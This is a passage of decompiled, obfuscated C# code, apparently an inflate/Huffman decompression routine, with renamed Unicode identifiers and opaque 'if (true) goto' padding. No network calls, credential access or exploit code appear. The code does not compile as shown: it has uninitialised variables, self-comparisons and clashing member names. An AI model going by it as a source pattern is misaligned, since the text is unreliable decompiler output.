        byte[] destinationArray = obj1;
        int destinationIndex = obj3;
        int length = num9;
        if (true)
          goto label_22;
label_10:
        if (true)
        {
          int num10 = obj3;
          num4 = num9;
          num3 = num10;
          goto label_12;
        }
        else
          continue;
label_22:
        Array.Copy((Array) sourceArray, sourceIndex, (Array) destinationArray, destinationIndex, length);
        goto label_10;
      }
      goto label_13;
label_21:
      num9 = num8;
      goto label_8;
label_12:
      obj3 = num3 + num4;
      obj0 = num2;
label_13:
      byte[] sourceArray1 = obj2.\u0001;
      int sourceIndex1 = num2 - obj0;
      byte[] destinationArray1 = obj1;
      int destinationIndex1 = obj3;
      int length1 = obj0;
      if (true)
        goto label_23;
label_14:
      obj2.\u0002 -= num6;
      if (obj2.\u0002 < 0)
        throw new InvalidOperationException();
      if (true)
        return num6;
      goto label_5;
label_23:
      Array.Copy((Array) sourceArray1, sourceIndex1, (Array) destinationArray1, destinationIndex1, length1);
      goto label_14;
label_18:
      num2 = num1;
      goto label_1;
    }

    static int \u0001([In] \u0003.\u0002 obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 0;
      int num2;
      int num3;
      while (true)
      {
        if (true)
          goto label_22;
label_6:
        int num4;
        while (true)
        {
          int num5;
          do
          {
            num3 = obj0.\u0003;
            if (true)
            {
              if (num3 <= 0)
                goto label_10;
              else
                goto label_8;
label_4:
              obj0.\u0001 >>= 8;
              obj0.\u0003 -= 8;
              int num6 = obj3 - 1;
              if (true)
                goto label_24;
label_5:
              num5 = num2 + 1;
              continue;
label_24:
              obj3 = num6;
              goto label_5;
label_8:
              num4 = obj3;
              if (true)
              {
                if (num4 > 0)
                {
                  byte[] numArray = obj1;
                  int index = obj2;
                  int num7 = index + 1;
                  if (true)
                    goto label_23;
label_3:
                  int num8 = (int) (byte) obj0.\u0001;
                  numArray[index] = (byte) num8;
                  goto label_4;
label_23:
                  obj2 = num7;
                  goto label_3;
                }
              }
              else
                goto label_29;
label_10:
              if (obj3 != 0)
              {
                int num9 = obj0.\u0002 - obj0.\u0001;
                if (true)
                  goto label_26;
label_14:
                int num10;
                if (obj3 > num10)
                {
                  int num11 = num10;
                  if (true)
                    obj3 = num11;
                }
                Array.Copy((Array) obj0.\u0001, obj0.\u0001, (Array) obj1, obj2, obj3);
                obj0.\u0001 += obj3;
                if ((obj0.\u0001 - obj0.\u0002 & 1) != 0)
                {
                  obj0.\u0001 = (uint) obj0.\u0001[obj0.\u0001++] & (uint) byte.MaxValue;
                  obj0.\u0003 = 8;
                }
                if (false)
                  goto label_4;
                else
                  goto label_19;
label_26:
                num10 = num9;
                goto label_14;
              }
              else
                goto label_11;
            }
            else
              goto label_12;
          }
          while (false);
          num2 = num5;
        }
label_29:
        num1 = num4;
        continue;
label_22:
        num2 = num1;
        goto label_6;
      }
label_12:
      return num3;
label_11:
      return num2;
label_19:
      if (true)
      {
        int num12 = num2;
        if (false)
          return num12;
        int num13 = obj3;
        return num12 + num13;
      }
      goto label_11;
    }

    static bool \u0001([In] \u0003.\u0005 obj0, [In] \u0003.\u0002 obj1)
    {
      int num1;
      while (true)
      {
        int num2 = obj0.\u0001;
        if (true)
          goto label_43;
label_1:
        int num3;
        int num4;
        int num5;
        int num6;
        int num7;
        switch (num3)
        {
          case 0:
            obj0.\u0002 = \u0004.\u0001(obj1, 5);
            num1 = obj0.\u0002;
            if (true)
            {
              if (num1 >= 0)
              {
                obj0.\u0002 += 257;
                \u0003.\u0002 obj = obj1;
                if (true)
                  goto label_44;
label_7:
                obj0.\u0001 = 1;
                goto case 1;
label_44:
                \u0004.\u0001(obj, 5);
                goto label_7;
              }
              else
                goto label_5;
            }
            else
              goto label_2;
          case 1:
            obj0.\u0003 = \u0004.\u0001(obj1, 5);
            if (obj0.\u0003 >= 0)
            {
              ++obj0.\u0003;
              \u0003.\u0002 obj = obj1;
              if (true)
                goto label_45;
label_11:
              obj0.\u0005 = obj0.\u0002 + obj0.\u0003;
              obj0.\u0002 = new byte[obj0.\u0005];
              obj0.\u0001 = 2;
              goto case 2;
label_45:
              \u0004.\u0001(obj, 5);
              goto label_11;
            }
            else
              goto label_9;
          case 2:
            obj0.\u0004 = \u0004.\u0001(obj1, 4);
            if (obj0.\u0004 >= 0)
            {
              obj0.\u0004 += 4;
              \u0003.\u0002 obj = obj1;
              if (true)
                goto label_46;
label_15:
              obj0.\u0001 = new byte[19];
              obj0.\u0007 = 0;
              obj0.\u0001 = 3;
              goto case 3;
label_46:
              \u0004.\u0001(obj, 4);
              goto label_15;
            }
            else
              goto label_13;
          case 3:
label_22:
            if (obj0.\u0007 < obj0.\u0004)
            {
              int num8 = \u0004.\u0001(obj1, 3);
              if (true)
                goto label_47;
label_17:
              num5 = num4;
              num6 = 0;
              break;
label_47:
              num4 = num8;
              goto label_17;
            }
            else
            {
              obj0.\u0001 = new \u0003.\u0004(obj0.\u0001);
              obj0.\u0001 = (byte[]) null;
              obj0.\u0007 = 0;
              obj0.\u0001 = 4;
              goto case 4;
            }
          case 4:
            int num9;
            int num10;
            int num11;
            do
            {
              num7 = \u0004.\u0001(obj0.\u0001, obj1);
              if (true)
              {
                num9 = num7;
                if ((num7 & -16) == 0)
                {
                  byte[] numArray = obj0.\u0002;
                  num3 = obj0.\u0007++;
                  int index = num3;
                  int num12 = (int) (obj0.\u0001 = (byte) num9);
                  numArray[index] = (byte) num12;
                  num10 = obj0.\u0007;
                  num11 = obj0.\u0005;
                  if (false)
                    goto label_49;
                }
                else
                  goto label_29;
              }
              else
                goto label_40;
            }
            while (num10 != num11);
            goto label_26;
label_49:
            num6 = num11;
            num5 = num10;
            break;
label_29:
            if (num9 >= 0)
            {
              if (num9 >= 17)
                obj0.\u0001 = (byte) 0;
              obj0.\u0006 = num9 - 16;
              obj0.\u0001 = 5;
              goto case 5;
            }
            else
              goto label_30;
          case 5:
            int num13 = \u0003.\u0005.\u0002[obj0.\u0006];
            int num14 = \u0004.\u0001(obj1, num13);
            if (num14 >= 0)
            {
              \u0004.\u0001(obj1, num13);
              int num15 = num14 + \u0003.\u0005.\u0001[obj0.\u0006];
              while (num15-- > 0)
              {
                byte[] numArray = obj0.\u0002;
                num3 = obj0.\u0007++;
                int index = num3;
                int num16 = (int) obj0.\u0001;
                numArray[index] = (byte) num16;
              }
              int num17 = obj0.\u0007;
              num7 = obj0.\u0005;
              num7 = num17;
              goto label_40;
            }
            else
              goto label_35;
          default:
            continue;
        }
        if (num5 >= num6)
        {
          \u0003.\u0002 obj = obj1;
          if (true)
            goto label_48;
label_21:
          obj0.\u0001[\u0003.\u0005.\u0003[obj0.\u0007]] = (byte) num4;
          ++obj0.\u0007;
          goto label_22;
label_48:
          \u0004.\u0001(obj, 3);
          goto label_21;
        }
        else
          goto label_19;
label_40:
        if (num7 != num7)
        {
          obj0.\u0001 = 4;
          continue;
        }
        goto label_41;
label_43:
        num3 = num2;
        goto label_1;
      }
label_2:
      return num1 != 0;
label_5:
      return false;
label_9:
      return false;
label_13:
      return false;
label_19:
      return false;
label_26:
      return true;
label_30:
      return false;
label_35:
      return false;
label_41:
      return true;
    }

    static int \u0001([In] \u0003.\u0007 obj0) => obj0.ReadByte() | obj0.ReadByte() << 8;

    static void \u0001([In] \u0003.\u0003 obj0, [In] int obj1)
    {
      do
      {
        \u0003.\u0003 obj2 = obj0;
        int num1 = obj2.\u0002;
        if (true)
          goto label_10;
label_1:
        obj2.\u0002 = num1 + 1;
label_2:
        int num2;
        if (true)
        {
          if (num2 != 32768)
            goto label_6;
label_4:
          continue;
label_6:
          byte[] numArray = obj0.\u0001;
          \u0003.\u0003 obj3 = obj0;
          int num3 = obj3.\u0001;
          if (true)
            goto label_11;
label_7:
          obj3.\u0001 = num3 + 1;
          int index = num2;
          int num4 = (int) (byte) obj1;
          numArray[index] = (byte) num4;
          if (true)
          {
            if (false)
              goto label_2;
            else
              goto label_9;
          }
          else
            goto label_4;
label_11:
          num2 = num3;
          goto label_7;
        }
        else
          continue;
label_10:
        num2 = num1;
        goto label_1;
      }
      while (false);
      throw new InvalidOperationException();
label_9:
      obj0.\u0001 &= (int) short.MaxValue;
    }

    static int \u0001([In] byte[] obj0, [In] int obj1, [In] int obj2, [In] \u0003.\u0001 obj3)
    {
      int num1;
      int num2;
      if (true)
      {
        int num3 = 0;
        if (num3 == 0)
        {
          if (true)
            num1 = num3;
        }
        else
        {
          num2 = num3;
          goto label_6;
        }
      }
      else
        goto label_9;
label_3:
      int num4 = obj3.\u0001;
      int num5 = 11;
      if (num5 != 0)
      {
        if (num4 != num5)
          num2 = \u0004.\u0001(obj2, obj0, obj3.\u0001, obj1);
        else
          goto label_13;
      }
      else
        goto label_8;
label_6:
      if (true)
        goto label_18;
label_7:
      int num6 = obj1;
      int num7;
      num5 = num7;
      num4 = num6;
      goto label_8;
label_18:
      num7 = num2;
      goto label_7;
label_8:
      obj1 = num4 + num5;
label_9:
      int num8 = num1;
      if (true)
      {
        int num9 = num7;
        int num10 = num8 + num9;
        if (true)
          goto label_19;
label_11:
        obj2 -= num7;
        if (obj2 == 0)
          return num1;
        goto label_13;
label_19:
        num1 = num10;
        goto label_11;
      }
      else
        goto label_15;
label_13:
      if (!\u0004.\u0001(obj3))
        num8 = obj3.\u0001.\u0002;
      else
        goto label_3;
label_15:
      if (num8 <= 0 || obj3.\u0001 == 11)
        return num1;
      goto label_3;
    }

    static int \u0001([In] \u0003.\u0003 obj0) => 32768 - obj0.\u0002;

    static void \u0001([In] \u0003.\u0004 obj0, [In] byte[] obj1)
    {
      int[] numArray1 = new int[16];
      if (true)
        goto label_39;
label_1:
      int[] numArray2 = new int[16];
      if (true)
        goto label_40;
label_2:
      if (true)
        goto label_41;
label_9:
      int index1;
      int[] numArray3;
      int num1;
      int num2;
      while (true)
      {
        num1 = index1;
        num2 = obj1.Length;
        if (true)
        {
          int num3 = num2;
          if (num1 < num3)
          {
            int num4 = (int) obj1[index1];
            if (true)
              goto label_42;
label_4:
            int num5;
            if (num5 > 0)
            {
              int[] numArray4 = numArray3;
              if (true)
                goto label_43;
label_6:
              int index2 = num5;
              if (true)
                goto label_44;
label_7:
              int[] numArray5;
              int index3;
              numArray4[index2] = numArray5[(IntPtr) index3] + 1;
              goto label_8;
label_44:
              index3 = index2;
              goto label_7;
label_43:
              numArray5 = numArray4;
              goto label_6;
            }
label_8:
            ++index1;
            continue;
label_42:
            num5 = num4;
            goto label_4;
          }
          else
            break;
        }
        else
          goto label_14;
      }
      int num6 = 0;
      int length = 512;
      int index4;
      if (true)
      {
        index4 = 1;
        goto label_18;
      }
      else
        goto label_36;
label_14:
      int num7 = 16;
      int num8 = index4;
      int[] numArray6;
      if (true)
      {
        int num9 = num7 - num8 & 31;
        int num10 = num2 << num9;
        num6 = num1 + num10;
        if (index4 >= 10)
        {
          int num11 = numArray6[index4] & 130944;
          int num12 = num6 & 130944;
          length += num12 - num11 >> 16 - index4;
        }
        ++index4;
      }
      else
        goto label_23;
label_18:
      int num13;
      int index5;
      if (index4 <= 15)
      {
        numArray6[index4] = num6;
        int num14 = num6;
        num2 = numArray3[index4];
        num1 = num14;
        goto label_14;
      }
      else
      {
        obj0.\u0001 = new short[length];
        num13 = 512;
        index5 = 15;
        goto label_26;
      }
label_20:
      int num15 = num6 & 130944;
      num6 -= numArray3[index5] << 16 - index5;
      int num16 = num6 & 130944;
      goto label_24;
label_22:
      int num17;
      int num18 = num17 - 9;
      num8 = 31;
      num7 = num18;
      int num19;
      num2 = num19;
      int num20;
      num1 = num20;
label_23:
      int num21 = num7 & num8;
      int num22 = num2 << num21;
      num13 = num1 + num22;
      num16 += 128;
label_24:
      if (num16 < num15)
      {
        obj0.\u0001[(int) \u0004.\u0001(num16)] = (short) (-num13 << 4 | index5);
        num20 = num13;
        num19 = 1;
        num17 = index5;
        goto label_22;
      }
      else
        --index5;
label_26:
      int index6;
      if (index5 < 10)
      {
        index6 = 0;
        goto label_38;
      }
      else
        goto label_20;
label_36:
      int index7;
      numArray6[index7] = num6 + (1 << 16 - index7);
label_37:
      ++index6;
label_38:
      if (index6 >= obj1.Length)
        return;
      index7 = (int) obj1[index6];
      if (index7 != 0)
      {
        num6 = numArray6[index7];
        int index8 = (int) \u0004.\u0001(num6);
        if (index7 <= 9)
        {
          do
          {
            obj0.\u0001[index8] = (short) (index6 << 4 | index7);
            index8 += 1 << index7;
            if (false)
              goto label_20;
          }
          while (index8 < 512);
          goto label_36;
        }
        else
        {
          int num23 = (int) obj0.\u0001[index8 & 511];
          int num24 = 1 << (num23 & 15);
          int num25 = -(num23 >> 4);
          int num26;
          int num27;
          int num28;
          do
          {
            obj0.\u0001[num25 | index8 >> 9] = (short) (index6 << 4 | index7);
            num26 = index8;
            num27 = 1;
            num28 = index7 & 31;
            if (true)
            {
              int num29 = num27 << num28;
              index8 = num26 + num29;
            }
            else
              goto label_45;
          }
          while (index8 < num24);
          goto label_36;
label_45:
          num17 = num28;
          num19 = num27;
          num20 = num26;
          goto label_22;
        }
      }
      else
        goto label_37;
label_41:
      index1 = 0;
      goto label_9;
label_40:
      numArray6 = numArray2;
      goto label_2;
label_39:
      numArray3 = numArray1;
      goto label_1;
    }
  }
}
